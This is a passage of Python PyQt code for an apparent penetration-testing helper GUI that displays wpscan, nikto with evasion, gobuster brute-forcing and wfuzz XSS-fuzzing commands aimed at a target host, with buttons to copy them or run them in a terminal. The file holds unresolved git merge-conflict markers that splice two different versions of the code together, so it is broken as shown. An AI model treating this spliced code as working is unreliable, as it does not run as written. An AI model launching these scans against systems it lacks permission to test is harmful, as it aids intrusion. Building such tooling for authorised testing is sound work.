        self.wpscanBF_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpscanBF_Scan1.text()))
        self.wpscanBF_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wpscanBF_Scan1 run button
        if hasattr(self, 'wpscanBF_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wpscanBF_Scan1_Run)
            self.wpscanBF_Scan1_Run.deleteLater()
        self.wpscanBF_Scan1_Run = QPushButton()
        self.wpscanBF_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wpscanBF_Scan1_Run.setFixedSize(QSize(20,20))
        command8 = self.wpscanBF_Scan1.text() + "; bash"
        self.wpscanBF_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command8]))
        self.wpscanBF_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wpscanBF_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpscanBF_Scan1_Copy)
        label_layout.addWidget(self.wpscanBF_Scan1_Run)
        label_layout.addWidget(self.wpscanBF_Scan1)
        self.tab2_container_layout.insertLayout(12, label_layout)
        self.tab2_container_layout.addStretch()

        # wpscanBF_spacer1
        if hasattr(self, 'wpscanBF_spacer1'):
            self.tab2_container_layout.removeWidget(self.wpscanBF_spacer1)
            self.wpscanBF_spacer1.deleteLater()
        self.wpscanBF_spacer1 = QLabel()
        self.wpscanBF_spacer1.setFixedWidth(40)
        self.wpscanBF_spacer1.setFixedHeight(20)

        # wpscanBF_spacer & divider layout
        self.tab2_container_layout.insertWidget(13, self.wpscanBF_spacer1)

# wpscan Aggressive Plugin Detection
        if hasattr(self, 'wpscanAPD'):
            self.tab2_container_layout.removeWidget(self.wpscanAPD)
            self.wpscanAPD.deleteLater()
        self.wpscanAPD = QLabel("[+ Aggressive Plugin Detection:]")
        self.wpscanAPD.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(14,self.wpscanAPD)

        if hasattr(self, 'wpscanAPD_Scan1'):
            self.tab2_container_layout.removeWidget(self.wpscanAPD_Scan1)
            self.wpscanAPD_Scan1.deleteLater()
        self.wpscanAPD_Scan1 = QLabel("wpscan --url http:// " + self.rhost + ":" + self.rport + " --enumerate p --plugins-detection aggressive")
        self.wpscanAPD_Scan1.setStyleSheet(
>>>>>>> 1509ee17b44fc71102be71b84fd37e22ae293d89
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
<<<<<<< HEAD
        self.container_layout.addWidget(censys_Scan1)
#### Copy Command to clipboard
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(censys_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        self.container_layout.addLayout(label_layout)
#### Run Command in new terminal 
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command35 = censys_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command35]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(censys_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
##############################################################################        
        self.container_layout.addStretch()

    
    def lpe(self):
        self.lhost
        self.tab4.layout = QVBoxLayout()
        self.scroll = QScrollArea()
        self.container = QWidget()
        self.container_layout = QVBoxLayout(self.container)
        self.container.setLayout(self.container_layout)
        self.scroll.setWidget(self.container)
        self.scroll.setWidgetResizable(True)
        self.container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
        self.container_layout.setContentsMargins(0,0,0,0)
        self.container.adjustSize()
        spacer = QSpacerItem(0, 25)
        divider = self.create_divider()
        self.tab4.layout.addWidget(self.scroll)
        self.tab4.setLayout(self.tab4.layout)
        
        shellPE = QtWidgets.QLabel("[+ I just got a low-priv shell !]")
        shellPE.setStyleSheet(
=======
      
        if hasattr(self, 'wpscanAPD_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wpscanAPD_Scan1_Copy)
            self.wpscanAPD_Scan1_Copy.deleteLater()
        self.wpscanAPD_Scan1_Copy = QPushButton()
        self.wpscanAPD_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpscanAPD_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpscanAPD_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpscanAPD_Scan1.text()))
        self.wpscanAPD_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
      
        if hasattr(self, 'wpscanAPD_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wpscanAPD_Scan1_Run)
            self.wpscanAPD_Scan1_Run.deleteLater()
        self.wpscanAPD_Scan1_Run = QPushButton()
        self.wpscanAPD_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wpscanAPD_Scan1_Run.setFixedSize(QSize(20,20))
        command9 = self.wpscanAPD_Scan1.text() + "; bash"
        self.wpscanAPD_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command9]))
        self.wpscanAPD_Scan1_Run.setStyleSheet("*:hover{background: '#20C20e';}")
        
        # wpscanAPD_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpscanAPD_Scan1_Copy)
        label_layout.addWidget(self.wpscanAPD_Scan1_Run)
        label_layout.addWidget(self.wpscanAPD_Scan1)
        self.tab2_container_layout.insertLayout(15, label_layout)
        self.tab2_container_layout.addStretch()

        # wpscan_divider 1
        if hasattr(self, 'wpscan_divider1'):
            self.tab2_container_layout.removeWidget(self.wpscan_divider1)
            self.wpscan_divider1.deleteLater()
        self.wpscan_divider1 = QFrame()
        self.wpscan_divider1.setFrameShape(QFrame.HLine)
        self.wpscan_divider1.setLineWidth(3)
        self.wpscan_divider1.setStyleSheet("color: #20C20E;")
        
        # wpscan_divider2
        if hasattr(self, 'wpscan_divider2'):
            self.tab2_container_layout.removeWidget(self.wpscan_divider2)
            self.wpscan_divider2.deleteLater()
        self.wpscan_divider2 = QFrame()
        self.wpscan_divider2.setFrameShape(QFrame.HLine)
        self.wpscan_divider2.setLineWidth(3)
        self.wpscan_divider2.setStyleSheet("color: #20C20E;")
        
        # wpscan_spacer1
        if hasattr(self, 'wpscan_spacer1'):
            self.tab2_container_layout.removeWidget(self.wpscan_spacer1)
            self.wpscan_spacer1.deleteLater()
        self.wpscan_spacer1 = QLabel()
        self.wpscan_spacer1.setFixedWidth(40)
        self.wpscan_spacer1.setFixedHeight(50)

        # wpscan_spacer2
        if hasattr(self, 'wpscan_spacer2'):
            self.tab2_container_layout.removeWidget(self.wpscan_spacer2)
            self.wpscan_spacer2.deleteLater()
        self.wpscan_spacer2 = QLabel()
        self.wpscan_spacer2.setFixedWidth(40)
        self.wpscan_spacer2.setFixedHeight(50)

        # wpscan_spacer & divider layout
        self.tab2_container_layout.insertWidget(16, self.wpscan_spacer1)
        self.tab2_container_layout.insertWidget(17, self.wpscan_divider1)
        self.tab2_container_layout.insertWidget(18, self.wpscan_divider2)
        self.tab2_container_layout.insertWidget(19, self.wpscan_spacer2)
        self.tab2_container_layout.addStretch()

        # niktoSE
        if hasattr(self, 'niktoSE'):
            self.tab2_container_layout.removeWidget(self.niktoSE)
            self.niktoSE.deleteLater()
        self.niktoSE = QLabel("[+ Nikto with SSL and Evasion:]")
        self.niktoSE.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(20,self.niktoSE)

        # niktoSE_Scan1
        if hasattr(self, 'niktoSE_Scan1'):
            self.tab2_container_layout.removeWidget(self.niktoSE_Scan1)
            self.niktoSE_Scan1.deleteLater()
        self.niktoSE_Scan1 = QLabel(f"nikto --host http://{self.rhost}:{self.rport} -ssl -evasion 1")
        self.niktoSE_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # niktoSE_Scan1 copy button
        if hasattr(self, 'niktoSE_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.niktoSE_Scan1_Copy)
            self.niktoSE_Scan1_Copy.deleteLater()
        self.niktoSE_Scan1_Copy = QPushButton()
        self.niktoSE_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.niktoSE_Scan1_Copy.setFixedSize(QSize(20,20))
        self.niktoSE_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.niktoSE_Scan1.text()))
        self.niktoSE_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # niktoSE_Scan1 run button
        if hasattr(self, 'niktoSE_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.niktoSE_Scan1_Run)
            self.niktoSE_Scan1_Run.deleteLater()
        self.niktoSE_Scan1_Run = QPushButton()
        self.niktoSE_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.niktoSE_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.niktoSE_Scan1.text() + "; bash"
        self.niktoSE_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.niktoSE_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # niktoSE_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.niktoSE_Scan1_Copy)
        label_layout.addWidget(self.niktoSE_Scan1_Run)
        label_layout.addWidget(self.niktoSE_Scan1)
        self.tab2_container_layout.insertLayout(21, label_layout)
        self.tab2_container_layout.addStretch()

        # niktoSE_spacer1
        if hasattr(self, 'niktoSE_spacer1'):
            self.tab2_container_layout.removeWidget(self.niktoSE_spacer1)
            self.niktoSE_spacer1.deleteLater()
        self.niktoSE_spacer1 = QLabel()
        self.niktoSE_spacer1.setFixedWidth(40)
        self.niktoSE_spacer1.setFixedHeight(20)

        # niktoSE_spacer & divider layout
        self.tab2_container_layout.insertWidget(22, self.niktoSE_spacer1)

# nikto
        if hasattr(self, 'nikto'):
            self.tab2_container_layout.removeWidget(self.nikto)
            self.nikto.deleteLater()
        self.nikto = QLabel("[+ Nikto Standard:]")
        self.nikto.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(23,self.nikto)

        # nikto_Scan1
        if hasattr(self, 'nikto_Scan1'):
            self.tab2_container_layout.removeWidget(self.nikto_Scan1)
            self.nikto_Scan1.deleteLater()
        self.nikto_Scan1 = QLabel(f"nikto --host http://{self.rhost}:{self.rport} -C all")
        self.nikto_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # nikto_Scan1 copy button
        if hasattr(self, 'nikto_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.nikto_Scan1_Copy)
            self.nikto_Scan1_Copy.deleteLater()
        self.nikto_Scan1_Copy = QPushButton()
        self.nikto_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.nikto_Scan1_Copy.setFixedSize(QSize(20,20))
        self.nikto_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.nikto_Scan1.text()))
        self.nikto_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nikto_Scan1 run button
        if hasattr(self, 'nikto_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.nikto_Scan1_Run)
            self.nikto_Scan1_Run.deleteLater()
        self.nikto_Scan1_Run = QPushButton()
        self.nikto_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.nikto_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.nikto_Scan1.text() + "; bash"
        self.nikto_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.nikto_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nikto_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.nikto_Scan1_Copy)
        label_layout.addWidget(self.nikto_Scan1_Run)
        label_layout.addWidget(self.nikto_Scan1)
        self.tab2_container_layout.insertLayout(24, label_layout)
        self.tab2_container_layout.addStretch()

        # nikto_divider1 
        if hasattr(self, 'nikto_divider1'):
            self.tab2_container_layout.removeWidget(self.nikto_divider1)
            self.nikto_divider1.deleteLater()
        self.nikto_divider1 = QFrame()
        self.nikto_divider1.setFrameShape(QFrame.HLine)
        self.nikto_divider1.setLineWidth(3)
        self.nikto_divider1.setStyleSheet("color: #20C20E;")
        
        # nikto_divider2
        if hasattr(self, 'nikto_divider2'):
            self.tab2_container_layout.removeWidget(self.nikto_divider2)
            self.nikto_divider2.deleteLater()
        self.nikto_divider2 = QFrame()
        self.nikto_divider2.setFrameShape(QFrame.HLine)
        self.nikto_divider2.setLineWidth(3)
        self.nikto_divider2.setStyleSheet("color: #20C20E;")
        
        # nikto_spacer1
        if hasattr(self, 'nikto_spacer1'):
            self.tab2_container_layout.removeWidget(self.nikto_spacer1)
            self.nikto_spacer1.deleteLater()
        self.nikto_spacer1 = QLabel()
        self.nikto_spacer1.setFixedWidth(40)
        self.nikto_spacer1.setFixedHeight(50)
        
        # nikto_spacer2
        if hasattr(self, 'nikto_spacer2'):
            self.tab2_container_layout.removeWidget(self.nikto_spacer2)
            self.nikto_spacer2.deleteLater()
        self.nikto_spacer2 = QLabel()
        self.nikto_spacer2.setFixedWidth(40)
        self.nikto_spacer2.setFixedHeight(50)

        # nikto_spacer & divider layout
        self.tab2_container_layout.insertWidget(25, self.nikto_spacer1)
        self.tab2_container_layout.insertWidget(26, self.nikto_divider1)
        self.tab2_container_layout.insertWidget(27, self.nikto_divider2)
        self.tab2_container_layout.insertWidget(28, self.nikto_spacer2)
        self.tab2_container_layout.addStretch()

# gobusterDir
        if hasattr(self, 'gobusterDir'):
            self.tab2_container_layout.removeWidget(self.gobusterDir)
            self.gobusterDir.deleteLater()
        self.gobusterDir = QLabel("[+ Gobuster Directory]")
        self.gobusterDir.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(29,self.gobusterDir)

        # gobusterDir_Scan1
        if hasattr(self, 'gobusterDir_Scan1'):
            self.tab2_container_layout.removeWidget(self.gobusterDir_Scan1)
            self.gobusterDir_Scan1.deleteLater()
        self.gobusterDir_Scan1 = QLabel(f"gobuster dir -u http://{self.rhost}:{self.rport} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -l -k -t 30")
        self.gobusterDir_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # gobusterDir_Scan1 copy button
        if hasattr(self, 'gobusterDir_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.gobusterDir_Scan1_Copy)
            self.gobusterDir_Scan1_Copy.deleteLater()
        self.gobusterDir_Scan1_Copy = QPushButton()
        self.gobusterDir_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.gobusterDir_Scan1_Copy.setFixedSize(QSize(20,20))
        self.gobusterDir_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.gobusterDir_Scan1.text()))
        self.gobusterDir_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # gobusterDir_Scan1 run button
        if hasattr(self, 'gobusterDir_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.gobusterDir_Scan1_Run)
            self.gobusterDir_Scan1_Run.deleteLater()
        self.gobusterDir_Scan1_Run = QPushButton()
        self.gobusterDir_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.gobusterDir_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.gobusterDir_Scan1.text() + "; bash"
        self.gobusterDir_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.gobusterDir_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # gobusterDir_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.gobusterDir_Scan1_Copy)
        label_layout.addWidget(self.gobusterDir_Scan1_Run)
        label_layout.addWidget(self.gobusterDir_Scan1)
        self.tab2_container_layout.insertLayout(30, label_layout)
        self.tab2_container_layout.addStretch()

        # gobusterDir_spacer1
        if hasattr(self, 'gobusterDir_spacer1'):
            self.tab2_container_layout.removeWidget(self.gobusterDir_spacer1)
            self.gobusterDir_spacer1.deleteLater()
        self.gobusterDir_spacer1 = QLabel()
        self.gobusterDir_spacer1.setFixedWidth(40)
        self.gobusterDir_spacer1.setFixedHeight(20)

        # gobusterDir_spacer & divider layout
        self.tab2_container_layout.insertWidget(31, self.gobusterDir_spacer1)

# gobusterFiles
        if hasattr(self, 'gobusterFiles'):
            self.tab2_container_layout.removeWidget(self.gobusterFiles)
            self.gobusterFiles.deleteLater()
        self.gobusterFiles = QLabel("[+ Gobuster Files]")
        self.gobusterFiles.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(32,self.gobusterFiles)

        # gobusterFiles_Scan1
        if hasattr(self, 'gobusterFiles_Scan1'):
            self.tab2_container_layout.removeWidget(self.gobusterFiles_Scan1)
            self.gobusterFiles_Scan1.deleteLater()
        self.gobusterFiles_Scan1 = QLabel(f"gobuster dir -u http://{self.rhost}:{self.rport} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -l -k -t 30")
        self.gobusterFiles_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # gobusterFiles_Scan1 copy button
        if hasattr(self, 'gobusterFiles_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.gobusterFiles_Scan1_Copy)
            self.gobusterFiles_Scan1_Copy.deleteLater()
        self.gobusterFiles_Scan1_Copy = QPushButton()
        self.gobusterFiles_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.gobusterFiles_Scan1_Copy.setFixedSize(QSize(20,20))
        self.gobusterFiles_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.gobusterFiles_Scan1.text()))
        self.gobusterFiles_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # gobusterFiles_Scan1 run button
        if hasattr(self, 'gobusterFiles_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.gobusterFiles_Scan1_Run)
            self.gobusterFiles_Scan1_Run.deleteLater()
        self.gobusterFiles_Scan1_Run = QPushButton()
        self.gobusterFiles_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.gobusterFiles_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.gobusterFiles_Scan1.text() + "; bash"
        self.gobusterFiles_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.gobusterFiles_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # gobusterFiles_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.gobusterFiles_Scan1_Copy)
        label_layout.addWidget(self.gobusterFiles_Scan1_Run)
        label_layout.addWidget(self.gobusterFiles_Scan1)
        self.tab2_container_layout.insertLayout(33, label_layout)
        self.tab2_container_layout.addStretch()

        # gobusterFiles_spacer1
        if hasattr(self, 'gobusterFiles_spacer1'):
            self.tab2_container_layout.removeWidget(self.gobusterFiles_spacer1)
            self.gobusterFiles_spacer1.deleteLater()
        self.gobusterFiles_spacer1 = QLabel()
        self.gobusterFiles_spacer1.setFixedWidth(40)
        self.gobusterFiles_spacer1.setFixedHeight(20)

        # gobusterFiles_spacer & divider layout
        self.tab2_container_layout.insertWidget(34, self.gobusterFiles_spacer1)

# gobusterSub
        if hasattr(self, 'gobusterSub'):
            self.tab2_container_layout.removeWidget(self.gobusterSub)
            self.gobusterSub.deleteLater()
        self.gobusterSub = QLabel("[+ Gobuster for SubDomain Brute Forcing]")
        self.gobusterSub.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(35,self.gobusterSub)

        # gobusterSub_Scan1
        if hasattr(self, 'gobusterSub_Scan1'):
            self.tab2_container_layout.removeWidget(self.gobusterSub_Scan1)
            self.gobusterSub_Scan1.deleteLater()
        self.gobusterSub_Scan1 = QLabel(f"gobuster dns -d domain.org -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30")
        self.gobusterSub_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # gobusterSub_Scan1 copy button
        if hasattr(self, 'gobusterSub_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.gobusterSub_Scan1_Copy)
            self.gobusterSub_Scan1_Copy.deleteLater()
        self.gobusterSub_Scan1_Copy = QPushButton()
        self.gobusterSub_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.gobusterSub_Scan1_Copy.setFixedSize(QSize(20,20))
        self.gobusterSub_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.gobusterSub_Scan1.text()))
        self.gobusterSub_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # gobusterSub_Scan1 run button
        if hasattr(self, 'gobusterSub_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.gobusterSub_Scan1_Run)
            self.gobusterSub_Scan1_Run.deleteLater()
        self.gobusterSub_Scan1_Run = QPushButton()
        self.gobusterSub_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.gobusterSub_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.gobusterSub_Scan1.text() + "; bash"
        self.gobusterSub_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.gobusterSub_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # gobusterSub_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.gobusterSub_Scan1_Copy)
        label_layout.addWidget(self.gobusterSub_Scan1_Run)
        label_layout.addWidget(self.gobusterSub_Scan1)
        self.tab2_container_layout.insertLayout(36, label_layout)
        self.tab2_container_layout.addStretch()

        # gobuster_divider1 
        if hasattr(self, 'gobuster_divider1'):
            self.tab2_container_layout.removeWidget(self.gobuster_divider1)
            self.gobuster_divider1.deleteLater()
        self.gobuster_divider1 = QFrame()
        self.gobuster_divider1.setFrameShape(QFrame.HLine)
        self.gobuster_divider1.setLineWidth(3)
        self.gobuster_divider1.setStyleSheet("color: #20C20E;")
        
        # gobuster_divider2
        if hasattr(self, 'gobuster_divider2'):
            self.tab2_container_layout.removeWidget(self.gobuster_divider2)
            self.gobuster_divider2.deleteLater()
        self.gobuster_divider2 = QFrame()
        self.gobuster_divider2.setFrameShape(QFrame.HLine)
        self.gobuster_divider2.setLineWidth(3)
        self.gobuster_divider2.setStyleSheet("color: #20C20E;")
        
        # gobuster_spacer1
        if hasattr(self, 'gobuster_spacer1'):
            self.tab2_container_layout.removeWidget(self.gobuster_spacer1)
            self.gobuster_spacer1.deleteLater()
        self.gobuster_spacer1 = QLabel()
        self.gobuster_spacer1.setFixedWidth(40)
        self.gobuster_spacer1.setFixedHeight(50)
        
        # gobuster_spacer2
        if hasattr(self, 'gobuster_spacer2'):
            self.tab2_container_layout.removeWidget(self.gobuster_spacer2)
            self.gobuster_spacer2.deleteLater()
        self.gobuster_spacer2 = QLabel()
        self.gobuster_spacer2.setFixedWidth(40)
        self.gobuster_spacer2.setFixedHeight(50)

        # gobuster_spacer & divider layout
        self.tab2_container_layout.insertWidget(37, self.gobuster_spacer1)
        self.tab2_container_layout.insertWidget(38, self.gobuster_divider1)
        self.tab2_container_layout.insertWidget(39, self.gobuster_divider2)
        self.tab2_container_layout.insertWidget(40, self.gobuster_spacer2)
        self.tab2_container_layout.addStretch()

        # wfuzzXSS
        if hasattr(self, 'wfuzzXSS'):
            self.tab2_container_layout.removeWidget(self.wfuzzXSS)
            self.wfuzzXSS.deleteLater()
        self.wfuzzXSS = QLabel("[+ Wfuzz XSS Fuzzing]")
        self.wfuzzXSS.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(41,self.wfuzzXSS)

        # wfuzzXSS_Scan1
        if hasattr(self, 'wfuzzXSS_Scan1'):
            self.tab2_container_layout.removeWidget(self.wfuzzXSS_Scan1)
            self.wfuzzXSS_Scan1.deleteLater()
        self.wfuzzXSS_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt http://{self.rhost}:{self.rport}/FUZZ")
        self.wfuzzXSS_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzXSS_Scan1 copy button
        if hasattr(self, 'wfuzzXSS_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzXSS_Scan1_Copy)
            self.wfuzzXSS_Scan1_Copy.deleteLater()
        self.wfuzzXSS_Scan1_Copy = QPushButton()
        self.wfuzzXSS_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzXSS_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wfuzzXSS_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzXSS_Scan1.text()))
        self.wfuzzXSS_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzXSS_Scan1 run button
        if hasattr(self, 'wfuzzXSS_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzXSS_Scan1_Run)
            self.wfuzzXSS_Scan1_Run.deleteLater()
        self.wfuzzXSS_Scan1_Run = QPushButton()
        self.wfuzzXSS_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzXSS_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzXSS_Scan1.text() + "; bash"
        self.wfuzzXSS_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzXSS_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzXSS_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzXSS_Scan1_Copy)
        label_layout.addWidget(self.wfuzzXSS_Scan1_Run)
        label_layout.addWidget(self.wfuzzXSS_Scan1)
        self.tab2_container_layout.insertLayout(42, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzXSS_Scan2
        if hasattr(self, 'wfuzzXSS_Scan2'):
            self.tab2_container_layout.removeWidget(self.wfuzzXSS_Scan2)
            self.wfuzzXSS_Scan2.deleteLater()
        self.wfuzzXSS_Scan2 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt http://10.11.1.71:80/FUZZ")
        self.wfuzzXSS_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzXSS_Scan2 copy button
        if hasattr(self, 'wfuzzXSS_Scan2_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzXSS_Scan2_Copy)
            self.wfuzzXSS_Scan2_Copy.deleteLater()
        self.wfuzzXSS_Scan2_Copy = QPushButton()
        self.wfuzzXSS_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzXSS_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wfuzzXSS_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzXSS_Scan2.text()))
        self.wfuzzXSS_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzXSS_Scan2 run button
        if hasattr(self, 'wfuzzXSS_Scan2_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzXSS_Scan2_Run)
            self.wfuzzXSS_Scan2_Run.deleteLater()
        self.wfuzzXSS_Scan2_Run = QPushButton()
        self.wfuzzXSS_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzXSS_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzXSS_Scan2.text() + "; bash"
        self.wfuzzXSS_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzXSS_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzXSS_Scan2 adding widgets
        label_layout = QHBoxLayout()
